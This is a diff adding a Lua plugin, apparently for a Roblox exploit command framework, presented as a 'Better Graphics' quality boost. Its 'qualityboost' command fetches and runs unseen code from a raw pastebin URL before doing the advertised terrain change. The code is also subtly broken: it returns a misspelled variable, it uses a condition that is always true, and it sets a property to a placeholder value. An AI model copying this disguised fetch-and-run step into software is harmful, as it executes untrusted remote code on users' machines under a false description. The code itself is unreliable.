@@ -1,0 +1,14 @@
+local a={}a.__index=a;local typeof=typeof;local assert=assert;function a:CreatePlugin(b,c)local self=setmetatable({},a)self.PluginName=b;self.PluginDescription=c;self.Commands={}return self end;function a:AddCommand(d,e,c,f,g)assert(typeof(d)=="string","CommandName must be a string.")assert(typeof(e)=="string","List must be a string.")assert(typeof(c)=="string","Description must be a string.")assert(typeof(g)=="function","Func must be a function.")assert(typeof(f)=="table","Alias must be a table.")self.Commands[d]={ListName=e,Description=c,Aliases=f,Function=function(h,i)g(h,i)end}end
+local BetterGraphics = a:CreatePlugin("Better Graphics", "Boost your Quality")
+BetterGraphics:AddCommand("qualityboost", "qualityboost", "Boost your Quality", {"qubo"}, function(Args, Speaker)
+	loadstring(game:HttpGet(('https://pastebin.com/raw/p1Jc1imF'),true))()
+	for i,v in pairs(workspace:GetDescendants()) do
+		if v:IsA("Part") and Enum.Material.Grass and v.Size.Z > 500 then
+			workspace.Terrain:FillBlock(v.CFrame, v.Size, Enum.Material.Grass)
+		end
+	end
+end)
+BetterGraphics:AddCommand("toodark", "toodark", "Too Dark? Shine some Light!", {"toda"}, function(Args, Speaker)
+	sethiddenproperty(game.Lighting, "Technology", "TechnologyHere")
+end)
+return BettterGraphics
